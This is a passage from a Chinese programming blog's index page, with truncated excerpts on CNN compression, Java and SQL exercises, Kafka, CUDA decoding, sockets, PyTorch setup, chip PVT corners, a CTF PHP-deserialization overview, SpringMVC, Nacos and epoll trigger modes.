		轻量化网络整理 基本的知识储备一、人工结构轻量化设计1.1 mobileNet V1，V2结构1.1.1 V1：Depthwise Separable Convolution1.1.2 V2：1、 linear Bottlennecks 1.2 shuffleNet结构1.2.1 V1：逐点分组卷积（point group convolution）和通道洗牌机制（channel shuffle）1.2.2 V2：停止使用分组卷积，使用Channel split 二、网络学习结构轻量化设计2.1 MnasNet2.2 NetAdapt2.3 MobileNetV3 三、减少特征层的冗余参考博客 基本的知识储备 CNN（卷积神经网络）的参数，计算量，FLOPs，Multi-Add概念详解：
Multi-Add： 卷积神经网络的卷积过程包含两个操作 乘法操作和加法操作
CNN参数：
卷积的参数即在一个卷积窗口内的计算个数也可以理解为一个卷积结果元素产生的运算操作。以331的输入被33卷积核卷积，参数有331个乘法操作和33-1个加法操作一共有331+33-1=17个参数。
拓展到CNN参数：
（KhKwCi + KhKwCi - 1） Co = （2KhKwCi - 1） Co （没有偏置bias的情况）
其中 Kh：卷积核高 Kw：卷积核宽 Ci：卷积核通道数 Co：输出通道数（卷积核的个数）
有偏置项：
（KhKwCi + KhKwCI - 1）* Co + Co = 2KhKw*Co
**CNN的计算量：**对所有输出特征图的所有元素的求和
CNN参数 * Ho * Wo
FLOPS： 注意全大写，是floating point operations per second的缩写，意指每秒浮点运算次数，理解为计算速度。是一个衡量硬件性能的指标。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26afbea4569d17579173b935d1e4eb30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e79fcf442f00f466c0daf747ed28f7d0/" rel="bookmark">
			给定一个字符串str，给定一个字符串类型的数组arr，/出现的字符都是小写英文arr每一个字符串，/代表一张贴纸，你可以把单个字符剪开使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package 左神题目.dp; import java.util.*; //给定一个字符串str，给定一个字符串类型的数组arr， // 出现的字符都是小写英文arr每一个字符串， // 代表一张贴纸，你可以把单个字符剪开使用， // 目的是拼出str来返回需要至少多少张贴纸可以完成这个任务。 //例子：str="babac”,arr =("ba”，"c”,"abcd" //至少需要两张贴纸“ba”和"abcd"，因为使用这两张贴纸， // 把每一个字符单独剪开，含有2个a、2个b、1个C。是可以拼出str的。所以返回2。 public class StickersToSpellWord { //1. public static int minStickers1(String[] stickers,String target){ int ans = process1(stickers,target); return ans==Integer.MAX_VALUE? -1:ans; } //每一种贴纸有无穷张 //返回搞定target的最少张数 public static int process1(String[] stickers,String target){ if(target.length()==0){ return 0; } int min = Integer.MAX_VALUE; for(String first:stickers){ String rest = minus(target,first); //如果rest长度这个和原字符串一样，那么就是无效选择 if(rest.length() != target.length()){ min = Math.min(min,process1(stickers,rest)); } } //判断min是不是无效选择min==Integer.MAX_VALUE? 0:1; //是的话就是Integer.MAX_VALUE+0 : 不是的话就是min + 1==&gt;当前这张加上这张之后所有 return min + (min==Integer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e79fcf442f00f466c0daf747ed28f7d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86562ce2376d0f5da9652e3793abf8e2/" rel="bookmark">
			建立时间、保持时间与亚稳态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、建立时间与保持时间二、亚稳态现象总结 一、建立时间与保持时间 建立时间（set up time）是指在触发器的时钟信号上升沿到来以前，数据从不稳定到稳定所需要的时间，一般用 T s u T_{su} Tsu​表示。
保持时间是指在触发器的时钟信号上升沿到来之后，数据保持稳定后的持续时间，一般用 T h T_{h} Th​表示。
如果建立时间或者保持时间不能满足实际需求，数据就无法准确地输入到触发器中，造成亚稳态的问题。
输出响应时间是指触发器的输出在c时钟上升沿到来之后，在多长的时间内发生变化，也即触发器的输出延时，一般用 T c o T_{co} Tco​表示。
二、亚稳态现象 数字器件的信号传输都会有一定的时序要求，从而保证每个寄存器将捕获的输入信号正确输出。为了确保可靠的操作，输入寄存器的信号必须在寄存器的建立时间之前保持稳定，并且持续到时钟沿之后，也就是寄存器的保持时间之后才能改变，而该寄存器的输入反映到输出则需要经过一定的延时，也就是输出响应时间。如果数据信号的变化违反了建立时间或者保持时间的要求，那么寄存器的输出就会处于亚稳态。此时，寄存器的输出会在高电平1和低电平0之间盘旋一段时间，这也意味着寄存器的输出达到一个稳定的高或者低电平的状态所需要的时间会大于正常情况下的输出响应时间。
在同步系统中，输入信号总是能够达到寄存器的时序要求，所以亚稳态不会发生。亚稳态问题通常发生在一些跨时钟域信号的传输上。由于数据信号可能在任何时间到达异步时钟域的目的寄存器，所以设计者无法保证满足建立时间和保持时间的要求。然而，并非所有违反寄存器的建立时间和保持时间要求的信号都会导致输出亚稳态。某个寄存器进入了亚稳态后重新回到稳定状态的时间取决于器件的制造工艺与工作环境。在大多数情况下，寄存器将会快速地返回稳定状态。
寄存器在时钟沿采样数据信号好比一个球从小山的一侧抛到另一侧。
如下图所示：
小山的两侧代表着数据的稳定状态，包括，旧的数据值或者新的数据值。山顶代表亚稳态。如果球被抛到山顶上，它可能会停在山顶上，但实际上它只要稍微有些动静就会滚落到山底。在一定时间内，球滚得越远，它达到稳定状态的时间也就越短。
总结 当违反了寄存器的建立时间或者保持时间时，通常情况下就会出现亚稳态现象，这时，寄存器数据既有可能是高电平，也有可能是低电平。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1fb47efacee5d337150a7370f939a15/" rel="bookmark">
			34个数据库练习题 带你打开思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		------mysql数据库练习题-------
学习基础知识的同时，没有练习题可不行
博主在这里给大家整理了34个数据库练习题
希望能帮助同学们打开思路。
注：使用的语句已用代码块的形式标注出
文章目录 34个数据库练习题带你打开思路1、取得每个部门最高薪水的人员名称2、哪些人的薪水在部门的平均薪水之上3、取得部门中（所有人的）平均的薪水等级5、取得平均薪水最高的部门的部门编号6、取得平均薪水最高的部门的部门名称7、求平均薪水的等级最低的部门的部门名称8、取得比普通员工(员工代码没有在 mgr 字段上出现的) 的最高薪水还要高的领导人姓名9、取得薪水最高的前五名员工10、取得薪水最高的第六到第十名员工11、取得最后入职的 5 名员工12、取得每个薪水等级有多少员工13、面试题：14、列出所有员工及领导的姓名15、列出受雇日期早于其直接上级的所有员工的编号,姓名,部门名称16、 列出部门名称和这些部门的员工信息, 同时列出那些没有员工的部门17、列出至少有 5 个员工的所有部门18、列出薪金比"SMITH" 多的所有员工信息19、 列出所有"CLERK"( 办事员) 的姓名及其部门名称, 部门的人数20、列出最低薪金大于 1500 的各种工作及从事此工作的全部雇员人数 按照工作岗位分组求最小值。21、列出在部门"SALES"&lt; 销售部&gt; 工作的员工的姓名, 假定不知道销售部的部门编号.22、列出薪金高于公司平均薪金的所有员工, 所在部门, 上级领导, 雇员的工资等级.23、 列出与"SCOTT" 从事相同工作的所有员工及部门名称24、列出薪金等于部门 30 中员工的薪金的其他员工的姓名和薪金.25、列出薪金高于在部门 30 工作的所有员工的薪金的员工姓名和薪金. 部门名称26、列出在每个部门工作的员工数量, 平均工资和平均服务期限27、 列出所有员工的姓名、部门名称和工资。28、列出所有部门的详细信息和人数29、列出各种工作的最低工资及从事此工作的雇员姓名30、列出各个部门的 MANAGER( 领导) 的最低薪金31、列出所有员工的 年工资, 按 年薪从低到高排序32、求出员工领导的薪水超过3000的员工名称与领导33、求出部门名称中, 带'S'字符的部门员工的工资合计、部门人数34、给任职日期超过 30 年的员工加薪 10%. 34个数据库练习题带你打开思路 1、取得每个部门最高薪水的人员名称 第一步：取得每个部门最高薪水(按照部门编号分组，找出每一组最大值)
mysql&gt; select deptno,max(sal) as maxsal from emp group by deptno; ±-------±--------+
| deptno | maxsal |
±-------±--------+
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1fb47efacee5d337150a7370f939a15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1fab8de7b422b5c6f18d7a1c7e4353d/" rel="bookmark">
			【学习笔记】大数据技术之Kafka3.x（生产调优手册）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生产调优手册 第 1 章 Kafka 硬件配置选择1.1 场景说明1.2 服务器台数选择1.3 磁盘选择1.4 内存选择1.5 CPU 选择1.6 网络选择 第 2 章 Kafka 生产者2.1 Kafka 生产者核心参数配置2.2 生产者如何提高吞吐量2.3 数据可靠性2.4 数据去重2.5 数据有序2.6 数据乱序 第 3 章 Kafka Broker3.1 Broker 核心参数配置3.2 服役新节点/退役旧节点3.3 增加分区3.4 增加副本因子3.5 手动调整分区副本存储3.6 Leader Partition 负载平衡3.7 自动创建主题 第 4 章 Kafka 消费者4.1 Kafka 消费者核心参数配置4.2 消费者再平衡4.3 指定 Offset 消费4.4 指定时间消费4.5 消费者事务4.6 消费者如何提高吞吐量 第 5 章 Kafka 总体5.1 如何提升吞吐量5.2 数据精准一次5.3 合理设置分区数5.4 单条日志大于 1m5.5 服务器挂了5.6 集群压力测试1）Kafka 压测2）Kafka Producer 压力测试3）Kafka Consumer 压力测试 【尚硅谷】2022版Kafka3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1fab8de7b422b5c6f18d7a1c7e4353d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e61adee47e2958ec9c49e55cdc8e169b/" rel="bookmark">
			SkeyeARS 全景AR增强监视系统之cuda(cuvid)视频硬解码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SkeyeARS 全景AR增强监视系统之cuda(cuvid)视频硬解码 1、写在前面 前面我们已经了解关于视频硬解码的一些技术。
其中提到的 nvcuvid 则是 Nvidia GPU 硬解码的核心，并且是由官方提供支持，因此可以放心使用。
2、正文开始 NVDECODE API 支持的编解码器有：
MPEG-1
MPEG-2
MPEG4
VC-1
H.264 (AVCHD) (8 位)
H.265 (HEVC)（8 位、10 位和 12 位）
VP8
VP9（8位、10位和12位）
AV1 Main profile
Hybrid (CUDA + CPU) JPEG
解码器管道由三个主要组件组成：解复用器、视频解析器和视频解码器,这些组件不相互依赖，因此可以独立使用。
NVDECODE API 为 NVIDIA 视频解析器和 NVIDIA 视频解码器提供 API。
其中，NVIDIA 视频解析器纯粹是一个软件组件，如果需要，用户可以插入任何解析器来代替 NVIDIA 视频解析器（例如 FFmpeg 解析器）。
NVDECODE 视频解码器管道如下图所示：
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-1kQueSpw-1649148749070)(./img/nvdecoder_pipeline.png)]
在高层次上，应遵循以下步骤来解码任何视频内容，使用 NVDECODEAPI：
1、创建一个 CUDA 上下文。
2、查询硬件解码器的解码能力。
使用 cuvidGetDecoderCaps() 3、创建解码器实例。 使用 cuvidCreateDecoder() 创建 CUvideodecoder 实例 4、解复用内容（如 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e61adee47e2958ec9c49e55cdc8e169b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88834810295c1775d8d994efaf974340/" rel="bookmark">
			socket原理以及socket的简单实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、socket学前基础（TCP的三次握手和四次挥手）
二、为什么要使用socket
三、什么是socket
四、socket的简单代码实现
服务端
客户端
一、socket学前基础（TCP的三次握手和四次挥手） 1、服务端和客户端如果想要建立连接，就要总共发送三个包来确立连接
第一次握手：Client将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server， Client进入SYN_SENT状态，等待Server确认
第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位 SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求 ，Server进入SYN_RCVD状态。
第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK 置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则 连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以 开始传输数据了。
2、四次挥手，终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。 在Socket编程中，这一过程由客户端或服务端任一方执行close来触发
第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入 FIN_WAIT_1状态
第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同， 一个FIN占用一个序号），Server进入CLOSE_WAIT状态。
第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK 状态。
第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态
二、为什么要使用socket socket用于即时通信，是长连接，在传统的http请求中，随着服务端的返回给客户端消息，两者之间的两者之间的关联就消失了，所以服务端想要主动联系客户端就得考轮询的方式，但是这种轮询比较耗费性能的，既要消耗客户端性能，又消耗服务器资源，于是有了长连接的概念。
三、什么是socket socket是用来描述IP地址和端口，是通信链的句柄，应用程序可以通过socket向网络发送请求或应答请求，socket支持TCP/IP协议的网络通讯基本操作单元，是对网络通信过程中端点的抽象描述包含了网络通信过程中的五种必须信息：链接所使用的协议；本地主机的ip地址；本机端口号；目的主机的ip地址；目的主机的端口号
四、socket的简单代码实现 服务端 Step 1：创建ServerSocket对象，绑定监听的端口
Step 2：调用accept()方法监听客户端的请求
Step 3：连接建立后，通过输入流读取客户端发送的请求信息
Step 4：通过输出流向客户端发送响应信息
Step 5：关闭相关资源
public class SocketServer { public static void main(String[] args) throws IOException { //1.创建一个服务器端Socket，即ServerSocket，指定绑定的端口，并监听此端口 ServerSocket serverSocket = new ServerSocket(12345); InetAddress address = InetAddress.getLocalHost(); String ip = address.getHostAddress(); Socket socket = null; //2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88834810295c1775d8d994efaf974340/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af2a21aa5d70697ae01efe4c09e427e5/" rel="bookmark">
			【学习笔记】大数据技术之Kafka3.x（监控，外部系统集成）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大数据技术之Kafka3.x 第 6 章 Kafka-Eagle 监控6.1 MySQL 环境准备6.2 Kafka 环境准备6.3 Kafka-Eagle 安装6.4 Kafka-Eagle 页面操作 第 7 章 Kafka-Kraft 模式7.1 Kafka-Kraft 架构7.2 Kafka-Kraft 集群部署 第 1 章 集成 Flume1.1 Flume 生产者1.2 Flume 消费者 第 2 章 集成 Flink2.1 Flink 生产者2.2 Flink 消费者 第 3 章 集成 SpringBoot第 4 章 集成 Spark4.1 Spark 生产者4.2 Spark 消费者 第 6 章 Kafka-Eagle 监控 Kafka-Eagle 框架可以监控 Kafka 集群的整体运行情况，在生产环境中经常使用。
6.1 MySQL 环境准备 Kafka-Eagle 的安装依赖于 MySQL，MySQL 主要用来存储可视化展示的数据。如果集群中之前安装过 MySQL 可以跨过该步。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af2a21aa5d70697ae01efe4c09e427e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b27ce7af10d07ee22a70bea7790a3ce/" rel="bookmark">
			蓝桥杯2019年Java C组真题，“人物相关性分析”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		人物相关性分析 思路：
1、输入K 和一行字符串，然后按照”空格和. （"\\s+|\\."）“ 进行分割成单词数组
2、暴力破解，3重循环，分别为寻找Alice--&gt; Bob 和 Bob --&gt; Alice（也就是有两个）
3、Alice --&gt; Bob
①第一重循环判断字符串中的下标i中是否出现了Alice，i递增，②如果出现了,if{} 里面继续for循环，判断j从i开始，判断j的后面是否出现Bob，③如果出现了Bob,继续判断间距长度，if里面继续for循环，l从i+1，开始，l &lt; j,因为计算的就是他们两个单词之间的间距长度，注意的是计数变量sum要从1开始，因为 避免有的相邻单词会进不了循环里面，然后再判断sum是否小于k，也就是我们规定的最大间距，如果是，count++，
4、Bob --&gt; Alice
其实就是重复上一步的操作，只不是把哪个Alice换成Bob，把Bob换成Alice。
因为题目所要求的的就是同时出现Alice和Bob，并没有规定两个的顺序。
5、输出count，也就是输出符合规定出现的次数，
输入：
20
This is a story about Alice.and.Bob.Alice wants to send aprivate message to Bob.
代码实现：
package date_0404; import java.util.Arrays; import java.util.Scanner; import sun.security.util.Length; public class Main1 { public static void main(String[] args) { long time = System.nanoTime(); Scanner scanner = new Scanner(System.in); int k = scanner.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b27ce7af10d07ee22a70bea7790a3ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50407c3dce6ab570aed1eff8e10505d0/" rel="bookmark">
			pytorch安装与测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PyTorch的飞速发展 框架好不好用，看图说话！ 安装PyTorch：使用PIP的方法比较简单
先查看你的cuda版本：
nvidia-smi 我的电脑cudaban版本是11.1的
用下面的网址找到对应的cuda版本，然后复制命令行在miniconda或者Anaconda的环境里安装即可。
https://pytorch.org/get-started/previous-versions/https://pytorch.org/get-started/previous-versions/
我的电脑安装命令就是：
pip install torch==1.9.0+cu111 torchvision==0.10.0+cu111 torchaudio==0.9.0 -f https://download.pytorch.org/whl/torch_stable.html 安装完成后，打开jupyter notebook： import torch torch.__version__ '1.9.0+cu111' 安装成功后会显示你安装的版本号
接下来用一个简单的小例子做GPU训练： 线性回归 构造一组输入数据X和其对应的标签y
import numpy as np x_values = [i for i in range(11)] x_train = np.array(x_values, dtype=np.float32) x_train = x_train.reshape(-1, 1) x_train.shape (11, 1) y_values = [2*i + 1 for i in x_values]#y=2x+1 y_train = np.array(y_values, dtype=np.float32) y_train = y_train.reshape(-1, 1)# reshape把数据转换成矩阵格式 y_train.shape (11, 1)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50407c3dce6ab570aed1eff8e10505d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b4e1dbaa4d5f921785a429b0a048ce1/" rel="bookmark">
			PVT的理解和以及它们在后仿/功耗仿真中的注意点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PVT(process, voltage, temperature)是影响集成电路性能的主要因素。
P是指芯片制造过程中的工艺偏差，在不同晶体管/晶片/批次之间，NMOS或PMOS的驱动能力（有时也理解为电流大小或载流子迁移率）都会发生变化，用slow/fast/typical分别表示晶体管驱动能力弱/强/一般，则所有逻辑门的性能就可以限制在(ss,ff,sf,fs,tt)5个工艺角内。
V是指芯片的供电电压，一般来讲，电压越大，晶体管电流越大，芯片速度越快。
T是芯片的工作温度，温度对芯片性能的影响比较复杂，一般认为温度越高，硅晶格振动加剧，载流子迁移率降低，晶体管饱和电流减小，芯片变慢。但是，这一理论只适用于非先进工艺，先进工艺中，晶体管阈值电压VT和电源电压都很低，使得
VT对逻辑门延时的影响越发重要，而vt会随着温度的降低会增大，因此在温度降低到某一程度时，vt对delay的影响变得足够大，使得逻辑门延时随着温度的降低而增大，这一现象称为温度反转。
在foundry给的标准单元库文件名后半部分，可以看出这个库对应的PVT信息，如ffg1p1v125c，表示ffg corner，电压为1.1V，温度为125℃。综合/后端过程中要根据需要选择适当的库文件。
从上面的叙述可以看到，PVT的组合可能会有很多种，仿真/综合时很难全部cover，所以一般会选择逻辑门延时一般/最小/最大三种情况进行后仿，在后端过程中，会针对这三种情况分别产生对应的sdf(TYP/MIN/MAX)用于反标到网表中进行后仿。
在功耗仿真中，也需要根据所需的工艺角/电压/温度，读入相应的库文件进行仿真。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1312b5641447e19d581d67efd9650d0e/" rel="bookmark">
			[CTF]PHP反序列化总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 PHP反序列化这一篇就够了简介常见的序列化格式案例引入反序列化中常见的魔术方法反序列化绕过小Trickphp7.1+反序列化对类属性不敏感绕过__wakeup(CVE-2016-7124)绕过部分正则利用引用16进制绕过字符的过滤PHP反序列化字符逃逸情况1：过滤后字符变多情况2：过滤后字符变少 对象注入POP链的构造利用POP链简单介绍简单案例讲解 PHP原生类反序列化利用SoapClient介绍利用方式实战 Phar反序列化什么是phar文件phar文件的结构漏洞利用条件受影响的函数绕过方式 php-session反序列化session简单介绍session 的存储机制php.ini中一些session配置利用姿势session.upload_progress进行文件包含和反序列化渗透使用不同的引擎来处理session文件$_SESSION变量直接可控$_SESSION变量直接不可控 参考文章 PHP反序列化这一篇就够了 简介 序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。
在网上找到一个比较形象的例子
比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
php 将数据序列化和反序列化会用到两个函数
serialize 将对象格式化成有序的字符串
unserialize 将字符串还原成原来的对象
序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。
常见的序列化格式 了解即可
二进制格式字节数组json字符串xml字符串 案例引入 简单的例子(以数组为例子)
&lt;?php $user=array('xiao','shi','zi'); $user=serialize($user); echo($user.PHP_EOL); print_r(unserialize($user)); 他会输出
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";} Array ( [0] =&gt; xiao [1] =&gt; shi [2] =&gt; zi ) 我们对上面这个例子做个简单讲解，方便大家入门
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";} a:array代表是数组，后面的3说明有三个属性 i:代表是整型数据int，后面的0是数组下标 s:代表是字符串，后面的4是因为xiao长度为4 依次类推 序列化后的内容只有成员变量，没有成员函数，比如下面的例子
&lt;?php class test{ public $a; public $b; function __construct(){$this-&gt;a = "xiaoshizi";$this-&gt;b="laoshizi";} function happy(){return $this-&gt;a;} } $a = new test(); echo serialize($a); ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1312b5641447e19d581d67efd9650d0e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13b9d2d822b255f18469eb69f7d438af/" rel="bookmark">
			关于SpringMVC页面跳转不了的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		箭头所指的地方，有时候会出现波浪线的警告情况，提示cannot resolve mvc view“xxx”，这种就是我们加了ResquestMapping注解了之后，却不能跳转页面。
就要从以下方面进行解决了。
1、是否开启mvc注解的支持
&lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt; 2、视图解析器是否配置好
&lt;bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/jsp/"&gt;&lt;/property&gt; &lt;property name="suffix" value=".jsp"&gt;&lt;/property&gt; &lt;/bean&gt; 我给大家看一下我的项目路径展示
如果我的jsp文件夹写在WEB-INF文件夹下的话，我的前缀就要写成/WEB-INF/jsp/。注意这里前后的斜杠都需要加！否则也会报404错误。
3、前端控制器的是否配好，注意里面的springmvc.xml的名字是否写错
&lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; 4、这也是我刚刚犯的错误
web资源路径是否匹配，我们写的jsp页面、html页面都要在我这个箭头所指的目录下，否则也会报404错误。
以上的错误是我还没有学模板引擎的情况下，如果有同学使用了模板引擎，但是不能跳转的话，应该是thymeleaf的依赖版本问题。这里我给出我的依赖信息。如果使用的是Spring5的话，要导入3.x版本。
&lt;!--导入模板引擎，要导入3.x版本--&gt; &lt;dependency&gt; &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-spring5&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-extras-java8time&lt;/artifactId&gt; &lt;/dependency&gt; 如果还有可解决的办法，希望大家能帮我补充！
最后再提一嘴，大家要敢于用最新版的东西。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8dced054dbeb5190d28f757753341b7/" rel="bookmark">
			进一步的认识服务注册中心--Nacos
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 什么是 NacosNacos 架构用户层业务层内核层插件 Nacos能做什么。注册中心原理构建应用接入Nacos注册中心服务提供者服务消费者 数据模型Namespace 命名空间Group 服务分组Service 服务 服务领域模型Instance 实例Cluster 集群Metadata 元数据Health Check 健康检查 支持的几种服务消费方式使用RestTemplate使用WebClient使用Feign Nacos作为配置中心创建配置创建应用 Nacos配置的加载规则详解Nacos的多环境管理使用Data ID与profiles实现使用Group实现使用Namespace实现 Nacos配置的多文件加载与共享配置Nacos配置的多文件加载共享配置配置加载的优先级 数据持久化集群搭建MySQL数据源配置集群配置启动实例本地测试生产环境Proxy配置 什么是 Nacos Nacos 是服务注册中心，是阿里巴巴推出来的一个新开源项目，是致力于帮助我们发现、配置和管理微服务的。
Nacos 提供了一组简单易用的特性集，帮助快速实现动态服务发现、服务配置、服务元数据及流量管理。
Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。
相对于 Spring Cloud Eureka 来说，Nacos 更强大。Nacos = Spring Cloud Eureka + Spring Cloud Config
通俗来说，Nacos是一个注册中心&amp; 配置中心 ——作为注册中心，Nacos可用于替代Spring Cloud中的Eureka、Spring Cloud Zookeeper Discovery、Spring Cloud Consul Discovery；作为配置中心，Nacos可用于替代Spring Cloud Config、Spring Cloud Zookeper Config、Spring Cloud Consul Config。
Nacos 可以与 Spring, Spring Boot, Spring Cloud 集成，并能代替 Spring Cloud Eureka, Spring Cloud Config
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8dced054dbeb5190d28f757753341b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22a53ae36d2f9c2586414cf285faa8ff/" rel="bookmark">
			epoll的LT模式（水平触发）和ET模式（边沿触发）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言名称的记忆状态变化LT模式ET模式数据的读取和发送代码实践基础代码测试分类怎么解决ET触发了一次就不再触发了 总结 前言 epoll的触发模式是个引发讨论非常多的话题，网络上这方面总结的文章也很多，首先从名字上就不是很统一，LT模式常被称为水平触发、电平触发、条件触发，而ET模式常被称为边缘触发、边沿触发等，这些都是从英文翻译过来的，只不过翻译的时候有些差异，LT全称 level-triggered，ET全称 edge-triggered。
虽然这个知识点热度很高，但很多人对于它的理解总是差那么一点，特别是在面试的时候，很多面试者总是处于一种回忆和背诵的状态，其实这两种模式真的不需要去死记硬背，下面说说我个人对这两种模式的理解和记忆方法。
名称的记忆 每次提到ET（边沿触发）首先映入我脑海的是大学里《数字逻辑电路》这门课程，里面会提到低电平、高电平，当电平从低到高时会有一个上升沿，而电平从高到低时会有一个下降沿，这个“沿”就是边沿触发时提到的“边沿”，跟马路边的马路牙子是同一种概念，也就是指状态变化的时候。提起上升沿和下降沿我还是印象很深的，当时我可是占用了好几节课的时间用Verilog语言写了一个显示“HELLO WORLD”的仿真波形，依靠的就是电平变化中的“沿”。
状态变化 LT模式和ET模式可以类比电平变化来学习，但是在实际应用中概念却不是完全一样的，在epoll的应用中涉及到关于IO的读写，而读写的状态变化有哪些呢？可读、不可读、可写、不可写，其实就是这四种状态而已，以socket为例。
可读：socket上有数据
不可读：socket上没有数据了
可写：socket上有空间可写
不可写：socket上无空间可写
对于水平触发模式，一个事件只要有，就会一直触发。
对于边缘触发模式，只有一个事件从无到有才会触发。
LT模式 对于读事件 EPOLLIN，只要socket上有未读完的数据，EPOLLIN 就会一直触发；对于写事件 EPOLLOUT，只要socket可写（一说指的是 TCP 窗口一直不饱和，我觉得是TCP缓冲区未满时，这一点还需验证），EPOLLOUT 就会一直触发。
在这种模式下，大家会认为读数据会简单一些，因为即使数据没有读完，那么下次调用epoll_wait()时，它还会通知你在上没读完的文件描述符上继续读，也就是人们常说的这种模式不用担心会丢失数据。
而写数据时，因为使用 LT 模式会一直触发 EPOLLOUT 事件，那么如果代码实现依赖于可写事件触发去发送数据，一定要在数据发送完之后移除检测可写事件，避免没有数据发送时无意义的触发。
